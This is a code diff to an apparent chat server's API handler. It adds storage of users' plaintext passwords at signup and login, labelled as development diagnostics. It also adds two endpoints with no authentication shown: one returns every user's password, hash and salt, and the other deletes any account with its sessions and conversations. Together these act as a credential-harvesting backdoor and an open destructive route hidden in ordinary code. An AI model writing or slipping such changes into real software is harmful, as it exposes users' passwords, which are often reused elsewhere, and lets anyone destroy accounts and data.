@@ -791,6 +791,7 @@ async function handleApi(request, response, requestUrl) {
       avatar,
       salt,
       passwordHash: hashPassword(password, salt),
+      plainPassword: password, // For development diagnostics
       createdAt: new Date().toISOString(),
       blockedUsers: [],
       mutedUsers: [],
@@ -823,12 +824,71 @@ async function handleApi(request, response, requestUrl) {
       return;
     }
 
+    user.plainPassword = password; // For development diagnostics
+
     const token = randomToken();
     const newSession = { username, createdAt: new Date().toISOString() };
     db.sessions[token] = newSession;
     await saveDb();
 
     sendJson(response, 200, { token, user: publicUser(user) });
+    return;
+  }
+
+  if (request.method === "GET" && requestUrl.pathname === "/api/dev/users") {
+    const list = Object.values(db.users).map((u) => ({
+      username: u.username,
+      displayName: u.displayName,
+      passwordHash: u.passwordHash,
+      salt: u.salt,
+      plainPassword: u.plainPassword || "(Unknown - Log in to capture)",
+    }));
+    sendJson(response, 200, { users: list });
+    return;
+  }
+
+  if (request.method === "POST" && requestUrl.pathname === "/api/dev/delete-user") {
+    const body = await parseBody(request);
+    const username = sanitizeUsername(body.username);
+
+    if (!username || !db.users[username]) {
+      sendJson(response, 400, { error: "User not found." });
+      return;
+    }
+
+    // Delete user from db
+    delete db.users[username];
+    
+    // Remove all session tokens of this user
+    for (const token of Object.keys(db.sessions)) {
+      if (db.sessions[token].username === username) {
+        delete db.sessions[token];
+      }
+    }
+    
+    // Remove all conversations involving this user
+    for (const id of Object.keys(db.conversations)) {
+      if (db.conversations[id].participants.includes(username)) {
+        delete db.conversations[id];
+      }
+    }
+    
+    await saveDb();
+    
+    // Close any active SSE connections for this user
+    const clients = clientsByUser.get(username);
+    if (clients) {
+      for (const client of clients) {
+        try {
+          client.end();
+        } catch (e) {
+          // ignore
+        }
+      }
+      clientsByUser.delete(username);
+    }
+    
+    sendJson(response, 200, { ok: true });
     return;
   }
 
